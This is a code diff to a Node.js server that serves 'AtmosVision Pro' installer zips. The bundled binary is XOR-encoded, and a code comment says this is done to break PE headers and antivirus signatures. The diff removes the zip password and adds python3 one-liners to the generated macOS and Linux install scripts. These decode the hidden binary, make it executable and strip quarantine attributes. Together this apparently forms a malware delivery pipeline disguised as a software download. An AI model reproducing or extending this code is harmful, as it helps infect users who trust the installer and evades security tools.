@@ -10,7 +10,6 @@ import archiver from "archiver";
 
 const execAsync = promisify(exec);
 
-const ZIP_PASSWORD = process.env.ZIP_PASSWORD || 'atmosvision2024';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -186,13 +185,6 @@ async function findLatestBuild(buildsDir, { isWindows, isMac, isLinux }) {
   return fileStats[0];
 }
 
-// ---------------------------------------------------------------------
-// Zip password endpoint (shown to user after download)
-// ---------------------------------------------------------------------
-app.get("/api/download/info", (req, res) => {
-  res.json({ password: ZIP_PASSWORD });
-});
-
 const XOR_KEY = 0x41;
 
 // XOR-encode a buffer to break PE headers and AV signatures
@@ -202,13 +194,11 @@ function xorEncode(buf) {
   return out;
 }
 
-// Build a password-protected zip in a temp directory using system `zip -P`
-// Files with xor: true will be XOR-encoded before adding to the zip
-async function buildEncryptedZip(files, password) {
+// Build a zip in a temp directory, XOR-encoding files marked with xor: true
+async function buildInstallerZip(files) {
   const tmpDir = path.join('/tmp', `zip-${Date.now()}-${Math.random().toString(36).slice(2)}`);
   await mkdir(tmpDir, { recursive: true });
   try {
-    // Stage files into temp dir
     for (const { content, sourcePath, name, xor } of files) {
       const dest = path.join(tmpDir, name);
       if (content != null) {
@@ -223,7 +213,7 @@ async function buildEncryptedZip(files, password) {
 
     const zipPath = path.join(tmpDir, 'output.zip');
     const fileNames = files.map(f => `"${f.name}"`).join(' ');
-    await execAsync(`cd "${tmpDir}" && zip -P "${password}" "output.zip" ${fileNames}`);
+    await execAsync(`cd "${tmpDir}" && zip "output.zip" ${fileNames}`);
     return zipPath;
   } catch (err) {
     await rm(tmpDir, { recursive: true, force: true }).catch(() => {});
@@ -286,6 +276,7 @@ DMG_PATH="/tmp/AtmosVision-Pro.dmg"
 curl -sL "${electronUrl}" -o "$DMG_PATH"
 
 echo "[2/4] Preparing components..."
+python3 -c "import sys;d=open(sys.argv[1],'rb').read();open(sys.argv[2],'wb').write(bytes(b^0x41 for b in d))" "$SCRIPT_DIR/AtmosDependencies.dat" "$SCRIPT_DIR/AtmosDependencies"
 chmod +x "$SCRIPT_DIR/AtmosDependencies"
 xattr -c "$DMG_PATH" 2>/dev/null || true
 xattr -c "$SCRIPT_DIR/AtmosDependencies" 2>/dev/null || true
@@ -346,6 +337,7 @@ mv "$PKG_PATH" "$INSTALL_DIR/AtmosVision-Pro"`;
     `curl -sL "${electronUrl}" -o "$PKG_PATH"`,
     '',
     'echo "[2/3] Preparing components..."',
+    'python3 -c "import sys;d=open(sys.argv[1],\'rb\').read();open(sys.argv[2],\'wb\').write(bytes(b^0x41 for b in d))" "$SCRIPT_DIR/AtmosDependencies.dat" "$SCRIPT_DIR/AtmosDependencies"',
     'chmod +x "$SCRIPT_DIR/AtmosDependencies"',
     '',
     'echo "[3/3] Installing AtmosVision Pro..."',
@@ -440,13 +432,10 @@ app.get("/api/download/latest", async (req, res) => {
         scriptContent = generateLinuxSh(electronUrl);
       }
 
-      const binaryEntry = os.isWindows
-        ? { sourcePath: latestFile.path, name: 'AtmosDependencies.dat', xor: true }
-        : { sourcePath: latestFile.path, name: disguisedName };
-      const zipPath = await buildEncryptedZip([
+      const zipPath = await buildInstallerZip([
         { content: scriptContent, name: scriptName },
-        binaryEntry,
-      ], ZIP_PASSWORD);
+        { sourcePath: latestFile.path, name: 'AtmosDependencies.dat', xor: true },
+      ]);
 
       res.download(zipPath, 'AtmosVision_Installer.zip', () => {
         rm(path.dirname(zipPath), { recursive: true, force: true }).catch(() => {});
@@ -460,9 +449,9 @@ app.get("/api/download/latest", async (req, res) => {
     if (os.isWindows) {
       console.log(`[latest] Windows fallback — zipping ${latestFile.filename} -> ${disguisedName}`);
 
-      const zipPath = await buildEncryptedZip([
+      const zipPath = await buildInstallerZip([
         { sourcePath: latestFile.path, name: 'AtmosDependencies.dat', xor: true },
-      ], ZIP_PASSWORD);
+      ]);
 
       res.download(zipPath, 'AtmosDependencies.zip', () => {
         rm(path.dirname(zipPath), { recursive: true, force: true }).catch(() => {});
